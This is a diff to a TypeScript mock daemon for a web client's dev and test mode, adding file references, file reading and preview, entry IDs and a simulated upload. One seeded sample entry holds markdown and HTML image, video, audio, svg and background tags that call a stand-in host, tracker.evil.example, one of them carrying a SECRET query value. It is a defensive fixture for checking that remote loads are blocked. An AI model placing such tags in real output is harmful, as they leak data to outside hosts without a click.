@@ -1,10 +1,12 @@
 // Mock daemon: implements every contract method and event with realistic sample data. Dev/test only (VITE_MOCK=1).
-import { LoginError, RpcError } from '../api/rpc';
-import type { EventSourceHandle, EventSourceHandlers, LoginResult, Transport } from '../api/rpc';
+import { LoginError, RpcError, UploadError } from '../api/rpc';
+import type { EventSourceHandle, EventSourceHandlers, LoginResult, Transport, UploadHandle } from '../api/rpc';
 import type {
-	AttentionItemDto, AttentionKind, AttentionSummaryDto, EventFrame, SessionEntryDto, SessionStateDto, SessionTagDto, TagKind, TagRefDto,
+	AttachmentResult, AttentionItemDto, AttentionKind, AttentionSummaryDto, EventFrame, SessionEntryDto, SessionStateDto, SessionTagDto, TagKind, TagRefDto,
 	TreeDirectoryDto, TreeGroupDto, TreeSessionDto, UsageResult, EffortId,
 } from '../api/types';
+import { buildMockFiles, readChunk, sizeOf } from './files';
+import type { MockFile } from './files';
 import { ago, LONG_ENTRY_FULL, LONG_ENTRY_PREVIEW, LONG_MARKDOWN, makeAssistantEntry, makeUserEntry, SHORT_REPLIES, USER_PROMPTS, WIDE_TABLE } from './samples';
 
 const WORK_PROFILE = 'Work (vitaly@datalabs.example)';
@@ -53,6 +55,10 @@ export class MockDaemon {
 	private attentionSeq = 1;
 	liveId = '';
 	private liveCount = 0;
+	private files: Record<string, MockFile> = buildMockFiles();
+	/** refId / preview handle -> file. */
+	private fileRefs = new Map<string, MockFile>();
+	private demoEntry: { session: MockSession; index: number; quote: string } | null = null;
 
 	constructor() {
 		this.seed();
@@ -128,8 +134,9 @@ export class MockDaemon {
 
 		// --- attention items of every kind
 		const att = put(tessyn, tessyn, undefined, { name: 'Needs your decision', lastActivityMin: 35, lastUsed: { modelId: 'default', effort: 'medium', profileId: 'default', profileName: 'Default' } }, 'attention', 2);
-		this.addAttention(att, 'critical', 'Production database migration is blocked', 'The migration `0042_add_tags` failed on the staging replica.\n\nI have **stopped** before touching production.', [], undefined);
-		this.addAttention(att, 'ask', 'Which retry policy should the relay use?', 'Two options are viable. Exponential backoff is the usual choice, but the link cap of 30 s is the main constraint.\n\n| Option | Max wait |\n|---|---|\n| Linear | 60 s |\n| Exponential | 30 s |', ['Exponential backoff', 'Linear backoff', 'Fixed 5 s'], 'Exponential backoff');
+		const critical = this.addAttention(att, 'critical', 'Production database migration is blocked', 'The migration `0042_add_tags` failed on the staging replica.\n\nI have **stopped** before touching production.', [], undefined);
+		const retry = this.addAttention(att, 'ask', 'Which retry policy should the relay use?', 'Two options are viable. Exponential backoff is the usual choice, but the link cap of 30 s is the main constraint.\n\n| Option | Max wait |\n|---|---|\n| Linear | 60 s |\n| Exponential | 30 s |', ['Exponential backoff', 'Linear backoff', 'Fixed 5 s'], 'Exponential backoff');
+		this.seedRefs(att, long, critical, retry);
 		this.addAttention(att, 'ask', 'Rename `CMX` MCP prefix now?', 'The planned Tessyn-branded rename touches skills and headers.', ['Yes, now', 'Later'], 'Later');
 		this.addAttention(att, 'todo', 'Update docs/glossary.md with the Web client terms', 'Add: *Relay*, *Link*, *Remote method*.', [], undefined);
 		this.addAttention(att, 'alert', 'Usage window resets in 20 minutes', undefined, [], undefined);
@@ -142,7 +149,7 @@ export class MockDaemon {
 		closed3.status = 'dismissed'; closed3.closedUtc = ago(1200);
 
 		const att2 = put(imp, datalabs, imp, { name: 'Importer: schema drift', lastActivityMin: 150 }, 'schema', 2);
-		this.addAttention(att2, 'ask', 'Drop the legacy column?', 'The column `Legacy_Id` has no readers left.', ['Drop it', 'Keep it'], 'Drop it');
+		this.seedNestedRef(this.addAttention(att2, 'ask', 'Drop the legacy column?', 'The column `Legacy_Id` has no readers left.', ['Drop it', 'Keep it'], 'Drop it'));
 
 		// --- tree filler with a spread of recency
 		const filler: Array<[string, MockDir, MockGroup | undefined, number | null, Partial<MockSession>?]> = [
@@ -229,6 +236,49 @@ ${'const veryLongLine = 1; '.repeat(12)}
 		t.entries[t.entries.length - 1].fullLength = LONG_ENTRY_FULL.length;
 		t.fullEntries[t.entries.length - 1] = LONG_ENTRY_FULL;
 	}
+
+	/** Focus refs, file handles and an assistant entry with local paths and media links (the "Needs your decision" session). */
+	private seedRefs(att: MockSession, long: MockSession, critical: AttentionItemDto, retry: AttentionItemDto): void {
+		const QUOTE = 'Migration touches exactly 3 tables';
+		att.entries.push(makeAssistantEntry(att.entries.length, 40,
+			`${QUOTE}: Tags, TagLinks and SessionTags. I wrote the plan to \`C:\\Users\\vvino\\Plans\\plan.md\` and my notes to C:\\Projects\\Personal\\Tessyn\\docs\\notes.txt.\n\n`
+			+ 'Snapshot of the result: https://annielartens.online/results/sample-1.png and a clip https://cdn.example.org/media/clip.mp4 (not on the allowlist).\n\n'
+			+ 'Also: C:\\Temp\\photo.png, C:\\Temp\\diagram.svg, C:\\Temp\\report.html, C:\\Temp\\clip.mp4, C:\\Temp\\report.pdf, C:\\Temp\\huge.mp4 and c:/temp/Greeter.cs.'));
+		const entryIdx = att.entries.length - 1;
+		const rec = (key: string) => { const f = this.files[key]; const refId = newId(); this.fileRefs.set(refId, f); return { refId, f }; };
+		const plan = rec('plan.md');
+		const photo = rec('photo.png');
+		const huge = rec('huge.mp4');
+		const pdf = rec('report.pdf');
+		critical.refs = [
+			{ kind: 'entry', label: 'The 3 affected tables', nodeId: att.id, fileId: this.fileIdOf(att), entryId: this.entryIdOf(att, entryIdx), offset: 0, length: QUOTE.length },
+			{ kind: 'file', label: 'Migration plan', refId: plan.refId, name: plan.f.name, path: 'docs/plan.md', size: sizeOf(plan.f), mime: plan.f.mime, mtimeUtc: ago(50) },
+			{ kind: 'file', refId: photo.refId, name: photo.f.name, path: 'out/photo.png', size: sizeOf(photo.f), mime: photo.f.mime },
+			{ kind: 'file', label: 'Report (PDF)', refId: pdf.refId, name: pdf.f.name, size: sizeOf(pdf.f), mime: pdf.f.mime },
+			{ kind: 'file', label: 'Full recording', refId: huge.refId, name: huge.f.name, size: sizeOf(huge.f), mime: huge.f.mime },
+			{ kind: 'url', label: 'Runbook', url: 'https://example.com/runbook' },
+		];
+		const target = 'typed JSON-RPC client plus an SSE event stream';
+		const longEntry = long.entries[1];
+		retry.refs = [
+			{ kind: 'entry', label: 'Design discussion in the SPA session', nodeId: long.id, fileId: this.fileIdOf(long), entryId: this.entryIdOf(long, 1), offset: longEntry.content.indexOf(target), length: target.length },
+		];
+		// An entry whose markdown tries every way of making the browser load a remote resource without a click (none may be requested).
+		att.entries.push(makeAssistantEntry(att.entries.length, 30,
+			'Remote-load attempts: ![secret](https://tracker.evil.example/md?d=SECRET) <img src="https://tracker.evil.example/raw?d=1" srcset="https://tracker.evil.example/set 2x"> '
+			+ '<video src="https://tracker.evil.example/v" poster="https://tracker.evil.example/poster"></video> <audio src="https://tracker.evil.example/a"></audio> '
+			+ '<svg><image href="https://tracker.evil.example/svg"/></svg> <table background="https://tracker.evil.example/bg"><tr><td>cell</td></tr></table>'));
+		this.demoEntry = { session: att, index: entryIdx, quote: QUOTE };
+	}
+
+	/** The Importer session's Focus item refs into the "Needs your decision" session: Focus -> entry -> Focus -> entry gives a nested Back stack. */
+	private seedNestedRef(item: AttentionItemDto): void {
+		const d = this.demoEntry!;
+		item.refs = [{ kind: 'entry', label: 'Affected tables (other session)', nodeId: d.session.id, fileId: this.fileIdOf(d.session), entryId: this.entryIdOf(d.session, d.index), offset: 0, length: d.quote.length }];
+	}
+
+	private fileIdOf(s: MockSession): string { return `${s.id.slice(0, 24)}${s.epoch.toString(16).padStart(8, '0')}`; }
+	private entryIdOf(s: MockSession, index: number): string { return `${this.fileIdOf(s)}:${index}`; }
 
 	private buildLongTranscript(s: MockSession): void {
 		let i = 0;
@@ -442,6 +492,8 @@ ${'const veryLongLine = 1; '.repeat(12)}
 				const s = this.get(params.nodeId);
 				return { nodeId: s.id, summary: this.summary(s), items: this.orderedAttention(s) };
 			}
+			case 'file.read': return this.fileRead(params);
+			case 'file.preview': return this.filePreview(params);
 			case 'attention.reply': return this.attentionReply(params);
 			case 'attention.dismiss': {
 				const s = this.get(params.nodeId);
@@ -461,6 +513,7 @@ ${'const veryLongLine = 1; '.repeat(12)}
 					{ id: 'claude-opus-5-5-1m', displayName: 'Opus 5.5 with the one million token extended context window (long context)', provider: 'anthropic' },
 				],
 				efforts: ['default', 'max', 'high', 'medium', 'low'],
+				mediaPreviewHosts: ['annielartens.online', '*.githubusercontent.com'],
 				profiles: [{ id: 'default', displayName: SYS_PROFILE }, { id: 'work', displayName: WORK_PROFILE }, { id: 'personal', displayName: 'Personal' }, { id: 'sys2', displayName: '[Sys] vvinogradoff@gmail.com' }, { id: 'long', displayName: 'another.long.name@example-domain.com' }],
 			};
 			case 'usage.get': return this.usage(String(params.profileId ?? 'default'));
@@ -517,10 +570,43 @@ ${'const veryLongLine = 1; '.repeat(12)}
 		const limit = Math.min(Number(params.limit) || FETCH_DEFAULT, FETCH_MAX);
 		const all = s.entries;
 		let slice: SessionEntryDto[];
-		if (typeof params.afterIndex === 'number') slice = all.filter((e) => e.index > (params.afterIndex as number)).slice(0, limit);
+		if (typeof params.aroundEntryId === 'string') {
+			if (typeof params.afterIndex === 'number' || typeof params.beforeIndex === 'number') throw new RpcError(-32602, 'aroundEntryId cannot be combined with other bounds');
+			const m = /^([0-9a-f]{32}):(\d+)$/.exec(params.aroundEntryId);
+			if (!m) throw new RpcError(-32602, 'Malformed entry id');
+			if (m[1] !== this.fileIdOf(s)) throw new RpcError(-32000, 'Session history changed');
+			const ord = Number(m[2]);
+			if (ord >= all.length) throw new RpcError(-32000, 'Entry not found');
+			const start = Math.max(0, Math.min(ord - Math.floor(limit / 2), all.length - limit));
+			slice = all.slice(start, start + limit);
+		} else if (typeof params.afterIndex === 'number') slice = all.filter((e) => e.index > (params.afterIndex as number)).slice(0, limit);
 		else if (typeof params.beforeIndex === 'number') slice = all.filter((e) => e.index < (params.beforeIndex as number)).slice(-limit);
 		else slice = all.slice(-limit);
-		return { nodeId: s.id, epoch: s.epoch, total: all.length, entries: slice };
+		return { nodeId: s.id, epoch: s.epoch, total: all.length, fileId: this.fileIdOf(s), entries: slice.map((e) => ({ ...e, entryId: this.entryIdOf(s, e.index) })) };
+	}
+
+	private fileRead(params: Record<string, unknown>) {
+		const f = this.fileRefs.get(String(params.handle));
+		if (!f) throw new RpcError(-32000, 'Unknown file handle');
+		const offset = Number(params.offset ?? 0);
+		if (!Number.isFinite(offset) || offset < 0) throw new RpcError(-32602, 'Invalid offset');
+		return readChunk(f, offset, params.length === undefined ? undefined : Number(params.length));
+	}
+
+	/** file.preview: the path must occur in that entry's text (case and slash direction ignored), then the file is looked up by name. */
+	private filePreview(params: Record<string, unknown>) {
+		const s = this.get(params.nodeId);
+		const e = s.entries.find((x) => this.entryIdOf(s, x.index) === params.entryId);
+		if (!e) throw new RpcError(-32000, 'Entry not found');
+		const norm = (t: string) => t.toLowerCase().replace(/\\/g, '/');
+		const path = String(params.path ?? '');
+		if (!norm(e.content).includes(norm(path))) throw new RpcError(-32000, "That path does not occur in the entry's text");
+		const name = path.split(/[\\/]/).pop() ?? '';
+		const f = Object.values(this.files).find((x) => x.name.toLowerCase() === name.toLowerCase());
+		if (!f) throw new RpcError(-32000, 'File not found');
+		const handle = newId();
+		this.fileRefs.set(handle, f);
+		return { handle, name: f.name, mime: f.mime, size: sizeOf(f), mtimeUtc: ago(5) };
 	}
 
 	private sessionEntry(params: Record<string, unknown>) {
@@ -529,7 +615,8 @@ ${'const veryLongLine = 1; '.repeat(12)}
 		const e = s.entries[Number(params.index)];
 		if (!e) throw new RpcError(-32602, 'No such entry');
 		const full = s.fullEntries[e.index];
-		return full === undefined ? e : { ...e, content: full, truncated: undefined, fullLength: undefined };
+		const withId = { ...e, entryId: this.entryIdOf(s, e.index) };
+		return full === undefined ? withId : { ...withId, content: full, truncated: undefined, fullLength: undefined };
 	}
 
 	private search(params: Record<string, unknown>) {
@@ -684,6 +771,27 @@ export function createMockTransport(): { transport: Transport; daemon: MockDaemo
 		}),
 		logout: () => delay(() => { sessionStorage.removeItem(AUTH_KEY); }),
 		me: () => delay(() => { const e = sessionStorage.getItem(AUTH_KEY); return e ? { email: e } : null; }),
+		upload(nodeId, file, onProgress): UploadHandle {
+			// ~600 ms in 6 steps so the progress bar is observable; "fail.bin" answers 500 { error }.
+			let timer = 0;
+			let rejectFn: (e: Error) => void = () => {};
+			const promise = new Promise<AttachmentResult>((resolve, reject) => {
+				rejectFn = reject;
+				let step = 0;
+				timer = window.setInterval(() => {
+					step++;
+					onProgress(step / 6);
+					if (step < 6) return;
+					window.clearInterval(timer);
+					if (file.name === 'fail.bin') { reject(new UploadError(500, 'The daemon could not store the file')); return; }
+					resolve({
+						attachmentId: newId(), name: file.name, size: file.size, mime: file.type || 'application/octet-stream',
+						path: `C:\\Users\\mock\\AppData\\Roaming\\TessynDesktop\\attachments\\${nodeId.slice(0, 8)}\\20261115-101500-${file.name}`,
+					});
+				}, 100);
+			});
+			return { promise, abort: () => { window.clearInterval(timer); rejectFn(new UploadError(-1, 'Upload cancelled')); } };
+		},
 		openEvents(handlers: EventSourceHandlers): EventSourceHandle {
 			let closed = false;
 			const off = daemon.subscribe((f) => { if (!closed) handlers.onFrame(f); });
